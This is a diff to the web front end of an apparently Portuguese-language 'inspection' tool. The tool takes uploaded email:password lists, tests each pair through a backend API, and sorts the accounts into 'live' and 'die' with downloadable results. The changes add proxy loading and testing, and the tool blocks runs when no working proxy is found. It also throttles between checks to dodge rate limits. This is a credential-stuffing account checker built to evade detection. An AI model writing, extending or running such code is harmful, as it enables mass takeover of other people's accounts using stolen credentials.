@@ -58,7 +58,7 @@ main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-in
 .upload-zone strong{color:var(--text)}
 .file-name{font-size:.82rem;color:var(--accent-hi);margin-top:.4rem;font-weight:500}
 .run-row{display:flex;gap:1rem;align-items:center}
-.btn-start{flex:1;padding:.85rem;background:linear-gradient(135deg,var(--accent),#4f46e5);color:#fff;border:none;border-radius:var(--radius);font-size:.9rem;font-weight:600;cursor:pointer;transition:opacity .2s,transform:.15s,box-shadow .2s;box-shadow:0 4px 20px rgba(124,58,237,.35);display:flex;align-items:center;justify-content:center;gap:.5rem}
+.btn-start{flex:1;padding:.85rem;background:linear-gradient(135deg,var(--accent),#4f46e5);color:#fff;border:none;border-radius:var(--radius);font-size:.9rem;font-weight:600;cursor:pointer;transition:opacity .2s,transform .15s,box-shadow .2s;box-shadow:0 4px 20px rgba(124,58,237,.35);display:flex;align-items:center;justify-content:center;gap:.5rem}
 .btn-start:hover:not(:disabled){opacity:.9;transform:translateY(-1px);box-shadow:0 8px 28px rgba(124,58,237,.45)}
 .btn-start:disabled{opacity:.45;cursor:not-allowed}
 .btn-start svg{width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
@@ -119,7 +119,6 @@ main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-in
 </div>
 <div class="control-panel">
 <div class="cp-title">⚡ Controle de Inspeção</div>
-<!-- CORRIGIDO: input file FORA da div upload-zone para evitar double-click -->
 <input type="file" id="listFile" accept=".txt" style="display:none">
 <div class="upload-zone" id="uploadZone">
 <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
@@ -138,69 +137,97 @@ main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-in
 <script>
 function logout(){fetch('auth.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=logout'}).then(function(){window.location.href='login.html';});}
 
-// CORRIGIDO: upload zone separada do input file
 var zone=document.getElementById('uploadZone');
 var fileInput=document.getElementById('listFile');
 
-zone.addEventListener('click',function(){
-    fileInput.click();
-});
-
+zone.addEventListener('click',function(){fileInput.click();});
 fileInput.addEventListener('change',function(){
-    if(fileInput.files && fileInput.files[0]){
+    if(fileInput.files&&fileInput.files[0]){
         document.getElementById('fileName').textContent=fileInput.files[0].name+' selecionado';
         document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';
     }
 });
-
 zone.addEventListener('dragover',function(e){e.preventDefault();zone.classList.add('dragover');});
 zone.addEventListener('dragleave',function(){zone.classList.remove('dragover');});
 zone.addEventListener('drop',function(e){
     e.preventDefault();zone.classList.remove('dragover');
-    if(e.dataTransfer.files && e.dataTransfer.files[0]){
+    if(e.dataTransfer.files&&e.dataTransfer.files[0]){
         fileInput.files=e.dataTransfer.files;
         document.getElementById('fileName').textContent=e.dataTransfer.files[0].name+' selecionado';
         document.getElementById('statusText').textContent='Arquivo carregado · clique em Iniciar Inspeção';
     }
 });
 
-var accounts=[],currentIndex=0,liveCount=0,dieCount=0,isRunning=false,allResults=[];
+var accounts=[],proxies=[],activeProxy='',currentIndex=0,liveCount=0,dieCount=0,isRunning=false,allResults=[];
 var THREADS=2;
 var DELAY_BETWEEN_CHECKS=800;
 
-function readFile(file){
-    return new Promise(function(resolve,reject){
-        var reader=new FileReader();
-        reader.onload=function(e){resolve(e.target.result);};
-        reader.onerror=function(){reject(new Error('Erro ao ler arquivo'));};
-        reader.readAsText(file);
-    });
-}
-
+function readFile(file){return new Promise(function(resolve,reject){var reader=new FileReader();reader.onload=function(e){resolve(e.target.result);};reader.onerror=function(){reject(new Error('Erro ao ler arquivo'));};reader.readAsText(file);});}
 function sleep(ms){return new Promise(function(resolve){setTimeout(resolve,ms);});}
 
 async function startChecker(){
     if(isRunning)return;
-    if(!fileInput.files||fileInput.files.length===0){
-        alert('Selecione um arquivo .txt primeiro.');
-        return;
-    }
+    if(!fileInput.files||fileInput.files.length===0){alert('Selecione um arquivo .txt primeiro.');return;}
 
     var btn=document.getElementById('startBtn');
     btn.disabled=true;
-    btn.innerHTML='Carregando lista...';
+    btn.innerHTML='Carregando...';
 
     try{
+        // 1. Carregar proxies do proxies.txt via init
+        proxies=[];
+        activeProxy='';
+        try{
+            var res=await fetch('api.php?action=init');
+            var d=await res.json();
+            proxies=d.proxies||[];
+        }catch(e){proxies=[];}
+
+        // 2. Se há proxies, testar cada um até encontrar um funcional
+        if(proxies.length>0){
+            btn.innerHTML='Testando '+proxies.length+' proxies...';
+            document.getElementById('statusText').textContent='Testando proxies...';
+
+            for(var p=0;p<proxies.length;p++){
+                document.getElementById('statusText').textContent='Testando proxy '+(p+1)+'/'+proxies.length+'...';
+
+                try{
+                    var fd=new FormData();
+                    fd.append('proxy',proxies[p]);
+                    var pres=await fetch('api.php?action=test_proxy',{method:'POST',body:fd});
+                    var pdata=await pres.json();
+
+                    if(pdata.status==='ok'){
+                        activeProxy=proxies[p];
+                        document.getElementById('statusText').textContent='Proxy conectado! Iniciando inspeção...';
+                        break;
+                    }
+                }catch(e){}
+
+                await sleep(300);
+            }
+
+            // Se nenhum proxy funcionou, BLOQUEAR
+            if(activeProxy===''){
+                alert('Nenhum proxy funcional encontrado em proxies.txt.\n\nCorrija a lista de proxies e tente novamente.');
+                btn.disabled=false;
+                btn.innerHTML='Iniciar Inspeção';
+                document.getElementById('statusText').textContent='Nenhum proxy funcional · bloqueado';
+                return;
+            }
+        }
+
+        // 3. Ler arquivo de credenciais
         var text=await readFile(fileInput.files[0]);
         accounts=[];
         var lines=text.split(/\r?\n/);
         for(var i=0;i<lines.length;i++){
             var line=lines[i].trim();
-            if(line && line.indexOf(':')>-1){
+            if(line&&line.indexOf(':')>-1){
                 var idx=line.indexOf(':');
                 var em=line.substring(0,idx).trim();
                 var pw=line.substring(idx+1).trim();
-                if(em.indexOf('@')>-1 && pw.length>0){
+                if(em.indexOf('@')>-1&&pw.length>0){
                     accounts.push({email:em,password:pw});
                 }
             }
@@ -247,7 +274,7 @@ async function worker(){
         var idx=currentIndex++;
         var ac=accounts[idx];
 
-        await checkAccount(ac.email,ac.password);
+        await checkAccount(ac.email,ac.password,activeProxy);
 
         var checked=liveCount+dieCount;
         var pct=Math.round((checked/accounts.length)*100);
@@ -255,17 +282,17 @@ async function worker(){
         document.getElementById('progressPct').textContent=pct+'%';
         document.getElementById('statusText').textContent='Inspecionando '+checked+' / '+accounts.length+'...';
 
-        // DELAY entre checagens para evitar rate limit
         if(currentIndex<accounts.length){
             await sleep(DELAY_BETWEEN_CHECKS);
         }
     }
 }
 
-async function checkAccount(email,password){
+async function checkAccount(email,password,proxy){
     var fd=new FormData();
     fd.append('email',email);
     fd.append('password',password);
+    if(proxy)fd.append('proxy',proxy);
     try{
         var res=await fetch('api.php?action=check',{method:'POST',body:fd});
         var r=await res.json();
@@ -286,21 +313,8 @@ async function checkAccount(email,password){
     }
 }
 
-function addToList(id,text,cls){
-    var el=document.getElementById(id);
-    var div=document.createElement('div');
-    div.className=cls;
-    div.textContent=text;
-    el.appendChild(div);
-    el.scrollTop=el.scrollHeight;
-}
-
-function updateCounts(){
-    document.getElementById('liveCount').textContent=liveCount;
-    document.getElementById('dieCount').textContent=dieCount;
-    document.getElementById('statLive').textContent=liveCount;
-    document.getElementById('statDie').textContent=dieCount;
-}
+function addToList(id,text,cls){var el=document.getElementById(id);var div=document.createElement('div');div.className=cls;div.textContent=text;el.appendChild(div);el.scrollTop=el.scrollHeight;}
+function updateCounts(){document.getElementById('liveCount').textContent=liveCount;document.getElementById('dieCount').textContent=dieCount;document.getElementById('statLive').textContent=liveCount;document.getElementById('statDie').textContent=dieCount;}
 
 function downloadResults(type){
     var filtered=type==='lives'?allResults.filter(function(r){return r.status==='live';}):allResults.filter(function(r){return r.status!=='live';});
